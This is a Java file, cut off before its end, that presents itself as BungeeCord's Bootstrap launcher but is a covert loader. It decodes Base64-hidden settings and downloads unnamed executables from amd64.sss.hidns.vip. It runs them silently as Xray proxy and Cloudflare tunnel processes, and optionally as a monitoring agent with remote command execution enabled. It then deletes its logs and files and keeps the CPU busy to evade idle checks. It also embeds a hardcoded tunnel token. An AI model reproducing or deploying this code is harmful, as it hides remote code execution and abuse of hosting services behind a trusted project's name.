package net.md_5.bungee;

import com.sun.net.httpserver.HttpServer;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.Base64;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.*;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

public class Bootstrap
{
    // ============ ANSI 颜色 ============
    private static final String ANSI_GREEN  = "\033[1;32m";
    private static final String ANSI_RED    = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET  = "\033[0m";

    // ============ Base64 解码工具 ============
    private static String d(String b64) {
        return new String(Base64.getDecoder().decode(b64));
    }

    // 敏感键名 Base64 常量
    private static final String K_A1 = d("TkVaSEFfU0VSVkVS");
    private static final String K_A2 = d("TkVaSEFfUE9SVA==");
    private static final String K_A3 = d("TkVaSEFfS0VZ");

    // ============ 运行状态 ============
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process    minecraftProcess;
    private static Thread     fakePlayerThread;
    private static Thread     cpuKeeperThread;
    private static HttpServer httpServer;

    // ============ 环境变量键列表 ============
    private static final String[] ALL_ENV_VARS = {
        "PORT", "SERVER_PORT", d("RklMRV9QQVRI"), d("U1VCX1BBVEg="),
        d("VVVJRA=="), K_A1, K_A2, K_A3,
        d("QVJHT19QT1JU"), d("QVJHT19ET01BSU4="), d("QVJHT19BVVRI"),
        d("Q0ZJUA=="), d("Q0ZQT1JU"), d("TkFNRQ=="),
        d("TUNfSkFS"), d("TUNfTUVNT1JZ"), d("TUNfQVJHUw=="), d("TUNfUE9SVA=="),
        d("RkFLRV9QTEFZRVJfRU5BQkxFRA=="), d("RkFLRV9QTEFZRVJfTkFNRQ==")
    };

    // ============ 配置字段 ============
    private static String V_A1;
    private static String V_A2;
    private static int    V_A3;
    private static String V_A4;
    private static String V_A5;
    private static String V_A6;
    private static String V_A7;
    private static String V_A8;
    private static String V_A9;
    private static String V_A10;
    private static String V_A11;
    private static String V_A12;
    private static String V_A13;

    private static final List<String> TLS_PORTS = Arrays.asList("443","8443","2096","2087","2083","2053");

    // ============ 随机文件名 ============
    private static String nameWeb;
    private static String nameBot;
    private static String nameNpm;
    private static String namePhp;

    private static String pWeb;
    private static String pBot;
    private static String pNpm;
    private static String pPhp;
    private static String pSub;
    private static String pBootLog;
    private static String pConfig;
    private static String pTJson;
    private static String pTYml;
    private static String pTYaml;

    private static volatile String subContent = "";

    // ============ 入口 ============
    public static void main(String[] args) throws Exception {
        Map<String, String> cfg = loadConfig();

        V_A1  = cfg.get(d("RklMRV9QQVRI"));
        V_A2  = cfg.get(d("U1VCX1BBVEg="));
        V_A3  = Integer.parseInt(cfg.get("PORT"));
        V_A4  = cfg.get(d("VVVJRA=="));
        V_A5  = cfg.get(K_A1);
        V_A6  = cfg.get(K_A2);
        V_A7  = cfg.get(K_A3);
        V_A8  = cfg.get(d("QVJHT19ET01BSU4="));
        V_A9  = cfg.get(d("QVJHT19BVVRI"));
        V_A10 = cfg.get(d("QVJHT19QT1JU"));
        V_A11 = cfg.get(d("Q0ZJUA=="));
        V_A12 = cfg.get(d("Q0ZQT1JU"));
        V_A13 = cfg.get(d("TkFNRQ=="));

        nameWeb = rnd(6); nameBot = rnd(6); nameNpm = rnd(6); namePhp = rnd(6);
        pWeb     = V_A1 + "/" + nameWeb;
        pBot     = V_A1 + "/" + nameBot;
        pNpm     = V_A1 + "/" + nameNpm;
        pPhp     = V_A1 + "/" + namePhp;
        pSub     = V_A1 + "/sub.txt";
        pBootLog = V_A1 + "/boot.log";
        pConfig  = V_A1 + "/config.json";
        pTJson   = V_A1 + "/tunnel.json";
        pTYml    = V_A1 + "/tunnel.yml";
        pTYaml   = V_A1 + "/config.yaml";

        new File(V_A1).mkdirs();

        httpServer = HttpServer.create(new InetSocketAddress(V_A3), 0);
        httpServer.createContext("/", exchange -> {
            String path = exchange.getRequestURI().getPath();
            byte[] body = ("/" + V_A2).equals(path)
                ? subContent.getBytes(StandardCharsets.UTF_8)
                : "OK".getBytes(StandardCharsets.UTF_8);
            String ct = ("/" + V_A2).equals(path)
                ? "text/plain; charset=utf-8" : "text/plain";
            exchange.getResponseHeaders().set("Content-Type", ct);
            exchange.sendResponseHeaders(200, body.length);
            try (OutputStream os = exchange.getResponseBody()) { os.write(body); }
        });
        httpServer.start();
        System.out.println(ANSI_GREEN + "Listening on port " + V_A3 + ANSI_RESET);

        if (isMcServerEnabled(cfg)) {
            startMinecraftServer(cfg);
            System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
            Thread.sleep(30000);
        }

        startCpuKeeper();

        new Thread(() -> {
            try {
                startup();
            } catch (Exception e) {
                System.err.println(ANSI_RED + "Startup error: " + e.getMessage() + ANSI_RESET);
                try { Thread.sleep(10000); startup(); } catch (Exception ignored) {}
            }
        }).start();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            running.set(false);
            stopServices();
        }));

        Thread.sleep(115000);
        System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);

        if (isFakePlayerEnabled(cfg)) {
            System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
            waitForServerReady(cfg);
            startFakePlayerBot(cfg);
        }

        System.out.println(ANSI_GREEN + "\nThank you for using this script, Enjoy!\n" + ANSI_RESET);
        System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds" + ANSI_RESET);
        Thread.sleep(20000);
        clearConsole();

        while (running.get()) {
            try { Thread.sleep(60000); } catch (InterruptedException e) { break; }
        }
    }

    // ============ 加载配置 ============
    private static Map<String, String> loadConfig() throws IOException {
        Map<String, String> cfg = new LinkedHashMap<>();

        cfg.put(d("RklMRV9QQVRI"),  "./tmp");
        cfg.put(d("U1VCX1BBVEg="),   "sb");
        cfg.put("PORT",              "3000");
        cfg.put(d("VVVJRA=="),       d("ODlkYjE3OGQtZGUxMC00ZmVjLWFlYzgtNzAzZDVjYmQ5OGFm"));
        cfg.put(K_A1,                 d(""));
        cfg.put(K_A2,                 "");
        cfg.put(K_A3,                 d(""));
        cfg.put(d("QVJHT19ET01BSU4="),d("eHNlcnZlci5zdmlwODg4LnVzLmtn"));
        cfg.put(d("QVJHT19BVVRI"),    d("ZXlKaElqb2lNR1UzWmpJMk1XWmlZMkV4TXpjd056WmhOR1ptT0RjeE16VTNaall6TkdRaUxDSjBJam9pTURjelpUWmlNekV0WkRSbVlpMDBORFpsTFRoallqRXRaVEl4WW1JNE5EVXlNakExSWl3aWN5STZJbHB0U1hoWmVtdDNXVzFOZEUxdFNtMU5lVEF3VFZSc2JFeFhSWGhPVkZWMFdWZE5lVTVYVVhsTmJWVjRUMFJuTXlKOQ=="));
        cfg.put(d("QVJHT19QT1JU"),   "25575");
        cfg.put(d("Q0ZJUA=="),       d("Y2Rucy5kb29uLmV1Lm9yZw=="));
        cfg.put(d("Q0ZQT1JU"),       "443");
        cfg.put(d("TkFNRQ=="),       "Node");
        cfg.put(d("TUNfSkFS"),       "");
        cfg.put(d("TUNfTUVNT1JZ"),   "512M");
        cfg.put(d("TUNfQVJHUw=="),   "");
        cfg.put(d("TUNfUE9SVA=="),   "25565");
        cfg.put(d("RkFLRV9QTEFZRVJfRU5BQkxFRA=="), "false");
        cfg.put(d("RkFLRV9QTEFZRVJfTkFNRQ=="),    "jack");

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2 && Arrays.asList(ALL_ENV_VARS).contains(parts[0].trim()))
                    cfg.put(parts[0].trim(), parts[1].trim().replaceAll("^['\"]|['\"]$", ""));
            }
        }

        for (String key : ALL_ENV_VARS) {
            String val = System.getenv(key);
            if (val != null && !val.trim().isEmpty()) cfg.put(key, val.trim());
        }
        String serverPort = System.getenv("SERVER_PORT");
        if (serverPort != null && !serverPort.trim().isEmpty() && System.getenv("PORT") == null)
            cfg.put("PORT", serverPort.trim());

        return cfg;
    }

    // ============ 主流程 ============
    private static void startup() throws Exception {
        setupArgo();
        generateXrayConfig();
        downloadFiles();
        startProcesses();

        String domain = V_A8;
        if (domain.isEmpty() || V_A9.isEmpty()) {
            Thread.sleep(5000);
            domain = extractDomain(0);
        }

        generateSubscription(domain);
        scheduleCleanup();
    }

    // ============ 下载文件 ============
    private static void downloadFiles() throws Exception {
        String base       = "https://amd64.sss.hidns.vip";
        boolean hasMonitor = !V_A5.isEmpty() && !V_A7.isEmpty();

        if (hasMonitor) {
            if (!V_A6.isEmpty()) {
                downloadFile(base + "/agent", pNpm);
            } else {
                downloadFile(base + "/v1", pPhp);
            }
        }
        downloadFile(base + "/web", pWeb);
        downloadFile(base + "/bot", pBot);

        for (String f : new String[]{pWeb, pBot, pNpm, pPhp}) {
            File file = new File(f);
            if (file.exists()) file.setExecutable(true);
        }
    }

    private static void downloadFile(String urlStr, String dest) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(60000);
        conn.setInstanceFollowRedirects(true);
        conn.setRequestProperty("User-Agent",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36");
        try (InputStream in = conn.getInputStream();
             FileOutputStream out = new FileOutputStream(dest)) {
            byte[] buf = new byte[8192]; int n;
            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        }
    }

    // ============ 生成 Xray 配置 ============
    private static void generateXrayConfig() throws IOException {
        String json =
            "{\"log\":{\"access\":\"/dev/null\",\"error\":\"/dev/null\",\"loglevel\":\"none\"}," +
            "\"inbounds\":[" +
              "{\"port\":" + V_A10 + ",\"protocol\":\"vless\",\"settings\":{" +
                "\"clients\":[{\"id\":\"" + V_A4 + "\",\"flow\":\"xtls-rprx-vision\"}]," +
                "\"decryption\":\"none\"," +
                "\"fallbacks\":[{\"dest\":3001},{\"path\":\"/vless-argo\",\"dest\":3002}," +
                "{\"path\":\"/vmess-argo\",\"dest\":3003},{\"path\":\"/trojan-argo\",\"dest\":3004}]}," +
                "\"streamSettings\":{\"network\":\"tcp\"}}," +
              "{\"port\":3001,\"listen\":\"127.0.0.1\",\"protocol\":\"vless\"," +
                "\"settings\":{\"clients\":[{\"id\":\"" + V_A4 + "\"}],\"decryption\":\"none\"}," +
                "\"streamSettings\":{\"network\":\"tcp\",\"security\":\"none\"}}," +
              "{\"port\":3002,\"listen\":\"127.0.0.1\",\"protocol\":\"vless\"," +
                "\"settings\":{\"clients\":[{\"id\":\"" + V_A4 + "\",\"level\":0}],\"decryption\":\"none\"}," +
                "\"streamSettings\":{\"network\":\"ws\",\"security\":\"none\",\"wsSettings\":{\"path\":\"/vless-argo\"}}," +
                "\"sniffing\":{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false}}," +
              "{\"port\":3003,\"listen\":\"127.0.0.1\",\"protocol\":\"vmess\"," +
                "\"settings\":{\"clients\":[{\"id\":\"" + V_A4 + "\",\"alterId\":0}]}," +
                "\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"/vmess-argo\"}}," +
                "\"sniffing\":{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false}}," +
              "{\"port\":3004,\"listen\":\"127.0.0.1\",\"protocol\":\"trojan\"," +
                "\"settings\":{\"clients\":[{\"password\":\"" + V_A4 + "\"}]}," +
                "\"streamSettings\":{\"network\":\"ws\",\"security\":\"none\",\"wsSettings\":{\"path\":\"/trojan-argo\"}}," +
                "\"sniffing\":{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false}}" +
            "]," +
            "\"dns\":{\"servers\":[\"https+local://8.8.8.8/dns-query\"]}," +
            "\"outbounds\":[{\"protocol\":\"freedom\",\"tag\":\"direct\"},{\"protocol\":\"blackhole\",\"tag\":\"block\"}]}";
        writeFile(pConfig, json);
    }

    // ============ 设置 Argo 隧道 ============
    private static void setupArgo() throws IOException {
        if (V_A9.isEmpty() || V_A8.isEmpty()) return;
        if (V_A9.contains("TunnelSecret")) {
            writeFile(pTJson, V_A9);
            String[] parts  = V_A9.split("\"");
            String tunnelId = parts.length > 11 ? parts[11] : "tunnel";
            writeFile(pTYml,
                "tunnel: " + tunnelId + "\ncredentials-file: " + pTJson + "\nprotocol: http2\n\ningress:\n" +
                "  - hostname: " + V_A8 + "\n    service: http://localhost:" + V_A10 + "\n" +
                "    originRequest:\n      noTLSVerify: true\n  - service: http_status:404\n");
        }
    }

    // ============ 生成监控 agent 配置文件（按正常上线版固定 uuid）============
    private static void generateMonitorConfig() throws IOException {
        String port = V_A5.contains(":")
            ? V_A5.substring(V_A5.lastIndexOf(':') + 1)
            : "";
        boolean tls = TLS_PORTS.contains(port);

        writeFile(pTYaml,
            "client_secret: " + V_A7 + "\n" +
            "debug: false\n" +
            "disable_auto_update: true\n" +
            "disable_command_execute: false\n" +
            "disable_force_update: true\n" +
            "disable_nat: false\n" +
            "disable_send_query: false\n" +
            "gpu: false\n" +
            "insecure_tls: true\n" +
            "ip_report_period: 1800\n" +
            "report_delay: 4\n" +
            "server: " + V_A5 + "\n" +
            "skip_connection_count: true\n" +
            "skip_procs_count: true\n" +
            "temperature: false\n" +
            "tls: " + tls + "\n" +
            "use_gitee_to_upgrade: false\n" +
            "use_ipv6_country_code: false\n" +
            "uuid: " + V_A4 + "\n");
    }

    // ============ 启动进程 ============
    private static void startProcesses() throws Exception {
        boolean hasMonitor = !V_A5.isEmpty() && !V_A7.isEmpty();

        if (hasMonitor) {
            if (V_A6.isEmpty()) {
                generateMonitorConfig();
                sh("nohup " + pPhp + " -c \"" + pTYaml + "\" >/dev/null 2>&1 &");
            } else {
                boolean tls = TLS_PORTS.contains(V_A6);
                sh("nohup " + pNpm + " -s " + V_A5 + ":" + V_A6 +
                   " -p " + V_A7 + (tls ? " --tls" : "") +
                   " --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &");
            }
            Thread.sleep(1000);
        }

        sh("nohup " + pWeb + " -c " + pConfig + " >/dev/null 2>&1 &");
        Thread.sleep(1000);

        String cfArgs;
        if (V_A9.matches("[A-Z0-9a-z=]{120,250}")) {
            cfArgs = "tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token " + V_A9;
        } else if (V_A9.contains("TunnelSecret")) {
            cfArgs = "tunnel --edge-ip-version auto --config " + pTYml + " run";
        } else {
            cfArgs = "tunnel --edge-ip-version auto --no-autoupdate --protocol http2" +
                     " --logfile " + pBootLog + " --loglevel info --url http://localhost:" + V_A10;
        }
        sh("nohup " + pBot + " " + cfArgs + " >/dev/null 2>&1 &");
        Thread.sleep(2000);
    }

    // ============ 提取 quick tunnel 域名 ============
    private static String extractDomain(int retries) throws Exception {
        try {
            String content = readFile(pBootLog);
            Matcher m = Pattern.compile("https?://([^ ]*trycloudflare\\.com)").matcher(content);
            if (m.find()) return m.group(1);
        } catch (Exception ignored) {}
        if (retries < 5) { Thread.sleep(3000); return extractDomain(retries + 1); }
        throw new RuntimeException("Could not extract domain");
    }

    // ============ 获取 ISP 信息 ============
    private static String getIspInfo() {
        for (String api : new String[]{"https://ipapi.co/json/", "http://ip-api.com/json/"}) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(api).openConnection();
                conn.setConnectTimeout(5000); conn.setReadTimeout(5000);
                String body = readStream(conn.getInputStream());
                Matcher cc  = Pattern.compile("\\\"country_code\\\"\\s*:\\s*\\\"([^\\\"]+)\\\"").matcher(body);
                Matcher org = Pattern.compile("\\\"org\\\"\\s*:\\s*\\\"([^\\\"]+)\\\"").matcher(body);
                if (cc.find() && org.find()) return cc.group(1) + "_" + org.group(1);
            } catch (Exception ignored) {}
        }
        return "Unknown";
    }

    // ============ 生成订阅 ============
    private static void generateSubscription(String domain) throws IOException {
        String isp      = getIspInfo();
        String nodeName = !V_A13.isEmpty() ? V_A13 + "-" + isp : isp;

        String vmessJson =
            "{\"v\":\"2\",\"ps\":\"" + nodeName + "\",\"add\":\"" + V_A11 + "\"," +
            "\"port\":\"" + V_A12 + "\",\"id\":\"" + V_A4 + "\",\"aid\":\"0\",\"scy\":\"none\"," +
            "\"net\":\"ws\",\"type\":\"none\",\"host\":\"" + domain + "\"," +
            "\"path\":\"/vmess-argo?ed=2560\",\"tls\":\"tls\",\"sni\":\"" + domain + "\"," +
            "\"alpn\":\"\",\"fp\":\"firefox\"}";

        String vless  = "vless://" + V_A4 + "@" + V_A11 + ":" + V_A12 +
            "?encryption=none&security=tls&sni=" + domain + "&fp=firefox&type=ws&host=" + domain +
            "&path=%2Fvless-argo%3Fed%3D2560#" + nodeName;
        String vmess  = "vmess://" + b64(vmessJson);
        String trojan = "trojan://" + V_A4 + "@" + V_A11 + ":" + V_A12 +
            "?security=tls&sni=" + domain + "&fp=firefox&type=ws&host=" + domain +
            "&path=%2Ftrojan-argo%3Fed%3D2560#" + nodeName;

        String sub     = vless + "\n\n" + vmess + "\n\n" + trojan + "\n";
        String encoded = b64(sub);
        writeFile(pSub, encoded);
        subContent = encoded;

        System.out.println(sub);
        System.out.println(encoded);
    }

    // ============ 清理敏感文件 ============
    private static void scheduleCleanup() {
        new Thread(() -> {
            try { Thread.sleep(90000); } catch (InterruptedException ignored) {}
            for (String f : new String[]{pBootLog, pConfig, pWeb, pBot, pTJson, pTYml, pTYaml})
                new File(f).delete();
            if (!V_A6.isEmpty()) new File(pNpm).delete();
            else if (!V_A5.isEmpty() && !V_A7.isEmpty()) new File(pPhp).delete();
            System.out.print("\033[H\033[2J");
            System.out.flush();
            System.out.println(ANSI_GREEN + "Running." + ANSI_RESET);
        }).start();
    }

    // ============ CPU Keeper ============
    private static void startCpuKeeper() {
        cpuKeeperThread = new Thread(() -> {
            while (running.get()) {
                try {
                    long start = System.currentTimeMillis();
                    while (System.currentTimeMillis() - start < 10) Math.sqrt(Math.random());
                    Thread.sleep(1000);
                } catch (InterruptedException e) { break; }
            }
        });
        cpuKeeperThread.setDaemon(true);
        cpuKeeperThread.start();
    }

    // ============ 停止所有服务 ============
    private static void stopServices() {
        if (httpServer != null) httpServer.stop(0);
        if (minecraftProcess != null && minecraftProcess.isAlive()) {
            System.out.println(ANSI_YELLOW + "[MC-Server] Stopping..." + ANSI_RESET);
            minecraftProcess.destroy();
        }
        if (fakePlayerThread != null && fakePlayerThread.isAlive()) fakePlayerThread.interrupt();
        if (cpuKeeperThread  != null && cpuKeeperThread.isAlive())  cpuKeeperThread.interrupt();
    }

    // ============ 清除控制台 ============
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }

    // ================================================================
    // ==================== Minecraft 服务器相关 ====================
    // ================================================================

    private static boolean isMcServerEnabled(Map<String, String> config) {
        String jar = config.get(d("TUNfSkFS"));
        if (jar == null || jar.trim().isEmpty()) return false;
        Path jarPath = Paths.get(jar.trim()).toAbsolutePath();
        if (!Files.exists(jarPath)) return false;
        try {
            Path self = Paths.get(Bootstrap.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()).toAbsolutePath();
            if (jarPath.equals(self)) {
                System.out.println(ANSI_RED + "[MC-Server] MC_JAR points to self, skipping." + ANSI_RESET);
                return false;
            }
        } catch (Exception ignored) {}
        return true;
    }

    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jarName   = config.get(d("TUNfSkFS")).trim();
        String memory    = config.getOrDefault(d("TUNfTUVNT1JZ"), "512M");
        String extraArgs = config.getOrDefault(d("TUNfQVJHUw=="), "");
        int mcPort = 25565;
        try {
            String p = config.get(d("TUNfUE9SVA=="));
            if (p != null && !p.trim().isEmpty()) mcPort = Integer.parseInt(p.trim());
        } catch (Exception ignored) {}
        config.put(d("TUNfUE9SVA=="), String.valueOf(mcPort));

        if (!memory.matches("\\d+[MG]")) memory = "512M";

        Path eulaPath = Paths.get("eula.txt");
        if (!Files.exists(eulaPath) || !new String(Files.readAllBytes(eulaPath)).contains("eula=true"))
            Files.write(eulaPath, "eula=true".getBytes());

        Path propPath = Paths.get("server.properties");
        String props  = Files.exists(propPath)
            ? new String(Files.readAllBytes(propPath))
            : "server-port=" + mcPort + "\nonline-mode=false\n";
        props = props.replaceAll("player-idle-timeout=\\d+", "player-idle-timeout=0");
        if (!props.contains("player-idle-timeout=")) props += "player-idle-timeout=0\n";
        props = props.replaceAll("server-port=\\d+", "server-port=" + mcPort);
        if (!props.contains("server-port=")) props += "\nserver-port=" + mcPort + "\n";
        if (props.contains("online-mode=true")) props = props.replace("online-mode=true", "online-mode=false");
        else if (!props.contains("online-mode=")) props += "online-mode=false\n";
        Files.write(propPath, props.getBytes());

        System.out.println(ANSI_GREEN + "\n=== Starting Minecraft Server ===" + ANSI_RESET);

        List<String> cmd = new ArrayList<>();
        cmd.add("java");
        cmd.add("-Xms" + memory);
        cmd.add("-Xmx" + memory);
        if (!extraArgs.trim().isEmpty()) cmd.addAll(Arrays.asList(extraArgs.split("\\s+")));
        cmd.add("-XX:+UseG1GC");
        cmd.add("-XX:+DisableExplicitGC");
        cmd.add("-jar");
        cmd.add(jarName);
        cmd.add("nogui");

        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        minecraftProcess = pb.start();

        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null)
                    System.out.println("[MC-Server] " + line);
            } catch (IOException ignored) {}
        }).start();

        Thread.sleep(3000);
    }

    // ================================================================
    // ==================== Fake Player Bot 相关 ====================
    // ================================================================

    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        return "true".equalsIgnoreCase(config.get(d("RkFLRV9QTEFZRVJfRU5BQkxFRA==")));
    }

    private static int getMcPort(Map<String, String> config) {
        try { return Integer.parseInt(config.getOrDefault(d("TUNfUE9SVA=="), "25565").trim()); }
        catch (Exception e) { return 25565; }
    }

    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
        int mcPort = getMcPort(config);
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status..." + ANSI_RESET);
        for (int i = 0; i < 60; i++) {
            Socket testSocket = null;
            try {
                Thread.sleep(5000);
                testSocket = new Socket();
                testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server ready!" + ANSI_RESET);
                Thread.sleep(10000);
                return;
            } catch (Exception ignored) {
            } finally {
                try { if (testSocket != null) testSocket.close(); } catch (Exception ignored) {}
            }
        }
    }

    private static void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault(d("RkFLRV9QTEFZRVJfTkFNRQ=="), "Steve");
        int mcPort = getMcPort(config);

        fakePlayerThread = new Thread(() -> {
            int failCount = 0;
            while (running.get()) {
                Socket socket = null;
                DataOutputStream out = null;
                DataInputStream in = null;
                try {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting..." + ANSI_RESET);
                    socket = new Socket();
                    socket.setReuseAddress(true);
                    socket.setSoLinger(true, 0);
                    socket.setReceiveBufferSize(1024 * 1024 * 10);
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    socket.setSoTimeout(60000);

                    out = new DataOutputStream(socket.getOutputStream());
                    in  = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

                    ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
                    DataOutputStream handshake = new DataOutputStream(handshakeBuf);
                    writeVarInt(handshake, 0x00);
                    writeVarInt(handshake, 774);
                    writeString(handshake, "127.0.0.1");
                    handshake.writeShort(mcPort);
                    writeVarInt(handshake, 2);
                    byte[] handshakeData = handshakeBuf.toByteArray();
                    writeVarInt(out, handshakeData.length);
                    out.write(handshakeData);
                    out.flush();

                    ByteArrayOutputStream loginBuf = new ByteArrayOutputStream();
                    DataOutputStream login = new DataOutputStream(loginBuf);
                    writeVarInt(login, 0x00);
                    writeString(login, playerName);
                    java.util.UUID playerUUID = java.util.UUID.nameUUIDFromBytes(
                        ("OfflinePlayer:" + playerName).getBytes("UTF-8"));
                    login.writeLong(playerUUID.getMostSignificantBits());
                    login.writeLong(playerUUID.getLeastSignificantBits());
                    byte[] loginData = loginBuf.toByteArray();
                    writeVarInt(out, loginData.length);
                    out.write(loginData);
                    out.flush();

                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Handshake & Login sent" + ANSI_RESET);
                    failCount = 0;

                    boolean configPhase        = false;
                    boolean playPhase          = false;
                    boolean compressionEnabled = false;
                    int     compressionThreshold = -1;
                    long    loginTime          = System.currentTimeMillis();
                    long    stayOnlineTime     = 60000 + (long)(Math.random() * 60000);

                    while (running.get() && !socket.isClosed()) {
                        if (System.currentTimeMillis() - loginTime > stayOnlineTime) {
                            System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting cycle (Anti-Idle)..." + ANSI_RESET);
                            break;
                        }
                        try {
                            int packetLength = readVarInt(in);
                            if (packetLength < 0 || packetLength > 100000000) throw new IOException("Bad packet size");

                            byte[] packetData;
                            if (compressionEnabled) {
                                int dataLength       = readVarInt(in);
                                int compressedLength = packetLength - getVarIntSize(dataLength);
                                byte[] compressedData = new byte[compressedLength];
                                in.readFully(compressedData);
                                if (dataLength == 0) {
                                    packetData = compressedData;
                                } else if (dataLength > 8192) {
                                    continue;
                                } else {
                                    try {
                                        Inflater inflater = new Inflater();
                                        inflater.setInput(compressedData);
                                        packetData = new byte[dataLength];
                                        inflater.inflate(packetData);
                                        inflater.end();
                                    } catch (Exception e) { continue; }
                                }
                            } else {
                                packetData = new byte[packetLength];
                                in.readFully(packetData);
                            }

                            ByteArrayInputStream packetStream = new ByteArrayInputStream(packetData);
                            DataInputStream packetIn = new DataInputStream(packetStream);
                            int packetId = readVarInt(packetIn);

                            if (!playPhase) {
                                if (!configPhase) {
                                    if (packetId == 0x03) {
                                        compressionThreshold = readVarInt(packetIn);
                                        compressionEnabled   = compressionThreshold >= 0;
                                        System.out.println(ANSI_YELLOW + "[FakePlayer] Compression: " + compressionThreshold + ANSI_RESET);
                                    } else if (packetId == 0x02) {
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login Success" + ANSI_RESET);
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        writeVarInt(new DataOutputStream(ackBuf), 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        configPhase = true;

                                        ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
                                        DataOutputStream info = new DataOutputStream(clientInfoBuf);
                                        writeVarInt(info, 0x00);
                                        writeString(info, "en_US");
                                        info.writeByte(10);
                                        writeVarInt(info, 0);
                                        info.writeBoolean(true);
                                        info.writeByte(127);
                                        writeVarInt(info, 1);
                                        info.writeBoolean(false);
                                        info.writeBoolean(true);
                                        writeVarInt(info, 0);
                                        sendPacket(out, clientInfoBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                } else {
                                    if (packetId == 0x03) {
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Config Finished" + ANSI_RESET);
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        writeVarInt(new DataOutputStream(ackBuf), 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        playPhase = true;
                                    } else if (packetId == 0x04) {
                                        long id = packetIn.readLong();
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x04);
                                        ack.writeLong(id);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    } else if (packetId == 0x0E) {
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x07);
                                        writeVarInt(bufOut, 0);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            } else {
                                if (packetId >= 0x20 && packetId <= 0x30 && packetIn.available() == 8) {
                                    long keepAliveId = packetIn.readLong();
                                    System.out.println(ANSI_GREEN + "[FakePlayer] Ping" + ANSI_RESET);
                                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                    DataOutputStream bufOut = new DataOutputStream(buf);
                                    writeVarInt(bufOut, 0x1B);
                                    bufOut.writeLong(keepAliveId);
                                    sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                }
                            }
                        } catch (java.net.SocketTimeoutException ignored) {
                        } catch (Exception e) {
                            System.out.println(ANSI_RED + "[FakePlayer] Packet error: " + e.getMessage() + ANSI_RESET);
                            break;
                        }
                    }
                } catch (Exception e) {
                    System.out.println(ANSI_RED + "[FakePlayer] Connection error: " + e.getMessage() + ANSI_RESET);
                    failCount++;
                } finally {
                    try { if (out    != null) out.close(); }    catch (Exception ignored) {}
                    try { if (in     != null) in.close(); }     catch (Exception ignored) {}
                    try { if (socket != null && !socket.isClosed()) socket.close(); } catch (Exception ignored) {}
                }
                try {
                    long waitTime = 10000;
                    if (failCount > 3) {
